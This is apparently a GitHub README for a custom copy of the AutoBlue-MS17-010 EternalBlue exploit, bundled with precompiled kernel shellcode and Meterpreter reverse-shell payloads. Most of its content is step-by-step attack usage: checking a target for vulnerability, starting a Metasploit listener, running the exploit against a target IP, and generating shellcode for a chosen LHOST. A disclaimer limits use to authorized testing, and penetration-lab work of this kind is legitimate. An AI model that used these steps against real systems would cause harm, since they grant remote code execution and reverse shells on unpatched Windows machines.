# Eternal-blue
# AutoBlue-MS17-010 – EternalBlue Exploit (My Custom Lab)

This repository is a working copy of the [AutoBlue-MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010) exploit for MS17-010 (EternalBlue).  
It includes pre‑compiled kernel shellcode and Metasploit payloads, along with a virtual environment setup for immediate use.

---

##  Disclaimer
**This tool is for educational and authorized security testing only.**  
You must own the target system or have explicit permission to test it. Misuse may violate laws.

---

##  Repository Contents
- Original exploit scripts (`eternal_checker.py`, `eternalblue_exploit.py`, …)
- Compiled kernel shellcode (x64 and x86) – generated with `nasm`
- Meterpreter reverse‑shell payloads (staged) created with `msfvenom`
- Listener helper script (`listener_prep.sh`)
- Python dependencies (`requirements.txt`)

---

##  Setup & Usage

### 1. Clone the repository
```bash
git clone https://github.com/YOUR_USERNAME/AutoBlue-MS17-010.git
cd AutoBlue-MS17-010

### 2. Create and activate a Python virtual environment
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

### 3. Verify the target is vulnerable
python eternal_checker.py <TARGET_IP>

4. Start a Metasploit listener (optional)
./listener_prep.sh
Follow the prompts (use the same LHOST/LPORT as when generating payloads).

5. Run the exploit
For a 64‑bit target:
python eternalblue_exploit.py <TARGET_IP> shellcode/sc_x64_msf.bin

For a 32‑bit target:
python eternalblue_exploit.py <TARGET_IP> shellcode/sc_x86_msf.bin

Customisation
Generate your own shellcode (if needed)
cd shellcode
./shell_prep.sh
Enter your LHOST, desired ports, and payload type (staged/stageless, cmd/meterpreter).
New .bin files will be created.

Dependencies
Python 3.12+

nasm (for compiling kernel shellcode)

Metasploit Framework (optional, for listeners)

All Python packages listed in requirements.txt


Original Source

https://github.com/3ndG4me/AutoBlue-MS17-010
Thanks to the original author for this excellent tool.


